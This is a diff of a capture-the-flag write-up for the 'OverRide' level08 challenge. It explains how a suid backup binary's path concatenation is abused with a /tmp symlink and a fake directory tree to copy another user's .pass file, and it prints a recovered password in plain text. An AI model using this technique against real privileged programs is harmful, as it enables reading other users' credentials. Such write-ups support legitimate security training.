@@ -1,28 +1,21 @@
-level08@OverRide:~$ ./level08 "../../../../home/users/level09/.pass"
-ERROR: Failed to open ./backups/../../../../home/users/level09/.pass
+### Step 1: Decompile with Ghydra
+
+- The source code is available in `source.c`
 
 
-- opens backups/.log to write logs
-- opens target file to read content with av[1]
-- opens target file to write flag with strncat("./backups", av[1], strlen(av[1]))
+### Step 2: Code Analysis
 
-strncat 
-
-buffer 100
-
-"./backups" (9)
-
-+ 
-
-"../../../../home/users/level09/.pass" (36)
-
-"../../../../../../../../../../../../../../../../../../../../../../../../../../../../home/users/level09/.pass"
+- 2 functions are present :
+    - A `log_wrapper` function that formats logs and writes to a filestream passed in parameters
+    - The `main` that opens the log file in `./backups/.log` (r+w), then opens a path specified by `av[1]` in read mode, and finally opens the path that results from the concatenation of `./backups/` and `av[1]` to write the content of the previous file
 
 
-### Tries
+### Step 3: Trying to Exploit
 
+- We want the flag the opened and read then written in the backups folder
 
-We can read a `.pass` file 
+- We can test that by opening the current flag present in level08's home and confirm that it works that way
+
 ```
 level08@OverRide:~$ ./level08 ".pass"
 level08@OverRide:~$ ls -la backups/
@@ -34,6 +27,20 @@ dr-xr-x---+ 1 level08 level08 100 Oct 19  2016 ..
 level08@OverRide:~$ cat backups/.pass
 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
 ```
+
+- We can then try to do the same thing with the flag present in level09's home. The binary should be able to open it with his suid
+
+```
+level08@OverRide:~$ ./level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+```
+
+The error shows that the flag was opened but the concatened path string contains an exeeding `/` character => We have to find a way to bypass to problems :
+    - The concatened string must be a valid path to write the output
+    - The path in `av[1]` must be a real path to the flag
+
+
+### Step 4: Final Exploit
 
 
 1) create symlink of the level08 binary to /tmp
@@ -58,18 +65,20 @@ This is used to bypass the error created by the forced concatenation of `./backu
 level08@OverRide:/tmp$ ./level08 /home/users/level09/.pass
 ERROR: Failed to open ./backups//home/users/level09/.pass
 ```
-This symlink will help to remove the `/` preceding `home`   
+This symlink will help to remove the `/` preceding `home` while preserving the path to the real flag
 
 3) create a fake folder tree in /tmp/backup to mimic to the behaviour of the binary backup function
 ```
 mkdir /tmp/backups /tmp/backups/home /tmp/backups/home/users /tmp/backups/home/users/level09
 ```
+The path provided is a real path to write the backup result  
 
 4) run level08 binary in /tmp
 ```
 cd /tmp
-./level08
+./level08 home/users/level09/.pass
 ```
+No error => the flag should be present in our `/tmp/backups/home/users/level09` folder  
 
 5) cat the flag store in our fake backup directory
 ```
